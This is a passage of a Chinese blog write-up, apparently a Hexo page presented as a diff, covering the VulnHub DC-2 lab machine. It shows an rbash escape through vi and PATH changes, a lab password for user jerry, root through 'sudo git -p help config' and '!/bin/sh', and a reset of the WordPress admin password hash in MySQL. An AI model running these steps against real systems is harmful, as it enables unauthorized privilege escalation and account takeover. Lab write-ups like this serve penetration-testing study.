+<p>给的提示是要我们切换到<code>jerry</code>用户。</p>
+<p>但是当前<code>su</code>命令因为rbash的存在，也没有办法执行，所以还是要先绕过rbash。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ su</span><br><span class="line">-rbash: su: command not found</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-1-利用vi-vim"><a href="#2-1-利用vi-vim" class="headerlink" title="2.1 利用vi/vim"></a>2.1 利用vi/vim</h5><p>在vi/vim编辑器中我们可以设置shell然后执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set shell=/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/17.png" alt="17"></p>
+<p>设置<code>shell=/bin/sh</code>之后，调用该<code>shell</code>变量：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/18.png" alt="18"></p>
+<p>回车之后就能看到进入了<code>/bin/sh</code>/。</p>
+<p>这里除了<code>vi</code>之外，其实<code>less</code>命令和<code>more</code>命令也有执行脚本的功能，具体的可以参考这篇文章，写的很详细：</p>
+<blockquote>
+<p><a href="http://www.oniont.cn/index.php/archives/143.html" target="_blank" rel="noopener">Linux 提权——突破受限制的shell权限</a></p>
+</blockquote>
+<h5 id="2-2-更改PATH或SHELL环境变量"><a href="#2-2-更改PATH或SHELL环境变量" class="headerlink" title="2.2 更改PATH或SHELL环境变量"></a>2.2 更改PATH或SHELL环境变量</h5><p>但是调用一些普通的命令，还是返回了<code>not found</code>错误：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/19.png" alt="19"></p>
+<p>打印当前环境变量：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">export</span> -p</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/20.png" alt="20"></p>
+<p>当前<code>PATH=&#39;/home/tom/usr/bin&#39;</code>，而我们知道linux的shell在执行命令时，会查找路径<code>$PATH</code>来寻找命令，而当前的<code>/home/tom/usr/bin</code>目录下仅存在四个命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">less</span><br><span class="line">ls</span><br><span class="line">scp</span><br><span class="line">vi</span><br></pre></td></tr></table></figure>
+
+<p>所以还需要修改<code>$PATH</code>的值：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin/:/usr/bin:<span class="variable">$PATH</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/21.png" alt="21"></p>
+<p>现在可以正常使用命令了，<code>su</code>到用户jerry，密码为<code>adipiscing</code>：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/22.png" alt="22"></p>
+<p>在jerry的home目录下发现第4个flag<code>flag4.txt</code>：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/23.png" alt="23"></p>
+<p>给出的提示是使用<code>git</code>命令来寻找最后的flag。</p>
+<h2 id="利用git提权"><a href="#利用git提权" class="headerlink" title="利用git提权"></a>利用git提权</h2><p>参考这2篇文章：</p>
+<blockquote>
+<p> <a href="https://gtfobins.github.io/gtfobins/git/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/git/</a> </p>
+<p> <a href="http://www.oniont.cn/index.php/archives/180.html" target="_blank" rel="noopener">http://www.oniont.cn/index.php/archives/180.html</a> </p>
+</blockquote>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/29.png" alt="29"></p>
+<p><code>-p | --paginate</code>的意思就是以分页的形式展示git的帮助信息，而且这个功能会调用<code>more</code>命令来完成，而<code>more</code>又有执行脚本的功能，所以键入<code>!/bin/sh</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo git -p <span class="built_in">help</span> config</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/26.png" alt="26"></p>
+<p>回车就能进入bash，因为是执行命令时使用了<code>sudo</code>，所以键入<code>whoami</code>返回的当前用户就是<code>root</code>了：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/27.png" alt="27"></p>
+<p>那为什么能够用<code>git</code>命令提权呢？</p>
+<p>我们用<code>sudo -l</code>查看当前用户的权限：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/24.png" alt="24"></p>
+<p>可以看到的是，只有<code>/usr/bin/git</code>命令具有<code>sudo</code>权限，如果使用<code>less</code>命令就会提示不允许用<code>sudo</code>执行。</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/25.png" alt="25"></p>
+<h2 id="获得wordpress站点admin账户信息"><a href="#获得wordpress站点admin账户信息" class="headerlink" title="获得wordpress站点admin账户信息"></a>获得wordpress站点admin账户信息</h2><p>到此为止我们就获得了整个站点的控制权，但是我还想了解一些wordpress站点的相关信息，因为前面就没能拿到管理员admin用户的密码。</p>
+<p>先从数据库开始吧，我们知道wordpress的数据库配置文件为<code>wp-config.php</code>：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/30.png" alt="30"></p>
+<p>读取该文件，发现数据库配置信息：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/31.png" alt="31"></p>
+<p>登录mysql之后，找到数据库<code>wordpressdb</code>和存储用户账号信息的数据表<code>wp_users</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| wordpressdb        |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use wordpressdb;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+-----------------------+</span><br><span class="line">| Tables_in_wordpressdb |</span><br><span class="line">+-----------------------+</span><br><span class="line">| wp_commentmeta        |</span><br><span class="line">| wp_comments           |</span><br><span class="line">| wp_links              |</span><br><span class="line">| wp_options            |</span><br><span class="line">| wp_postmeta           |</span><br><span class="line">| wp_posts              |</span><br><span class="line">| wp_term_relationships |</span><br><span class="line">| wp_term_taxonomy      |</span><br><span class="line">| wp_termmeta           |</span><br><span class="line">| wp_terms              |</span><br><span class="line">| wp_usermeta           |</span><br><span class="line">| wp_users              |</span><br><span class="line">+-----------------------+</span><br><span class="line">12 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p><code>admin</code>账号的信息肯定是密文保护的：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/32.png" alt="32"></p>
+<p>然后就需要直接在mysql中修改管理员账号的密码，google搜索<code>wordpress change admin password mysql</code>，搜索到一篇文章：</p>
+<blockquote>
+<p> <a href="https://www.tecmint.com/reset-wordpress-admin-password-via-mysql-command/" target="_blank" rel="noopener">https://www.tecmint.com/reset-wordpress-admin-password-via-mysql-command/</a> </p>
+</blockquote>
+<p>虽然看起来所有的wp密码都是以<code>$P$B</code>开头的，但是其实这个密码还可以用简单的<code>md5</code>值（具体原因不是很清楚），所以更改密码很简单：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; UPDATE wp_users SET user_pass &#x3D; MD5(&#39;123456&#39;) WHERE ID&#x3D;1;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/33.png" alt="33"></p>
+<p>更改密码之后就能够登录后台：</p>
+<p><img src="/2020/06/22/VulnHub_DC-2/imgs/34.png" alt="34"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>了解了两款新的工具，一个是<code>wpscan</code>，它是一款由ruby编写、基于白盒测试的WordPress安全扫描器，能够尝试寻找<strong>已安装的WordPress站点</strong>的一些<strong>已知</strong>的安全漏洞。</li>
+<li>第2个工具是密码字典生成工具<code>cewl</code>。</li>
+<li>了解了<code>vi</code>，<code>vim</code>，<code>less</code>，<code>more</code>命令可以执行脚本；<code>git -p</code>命令因为会默认调用<code>more</code>，所以同样可以执行脚本。当条件允许时，还可以用这些命令来提权。</li>
+<li>但是还有不足之处，比如在面对wordpress站点时，只能得到两个低权限的账号，而面对admin管理员账号还是一无所知。显然在这一方面的技能点还很欠缺。</li>
+</ol>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/06/22/VulnHub_DC-2/">https://bantttian.github.io/2020/06/22/VulnHub_DC-2/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/06/20/VulnHub_DC-1/">VulnHub_DC-1靶机渗透测试学习</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
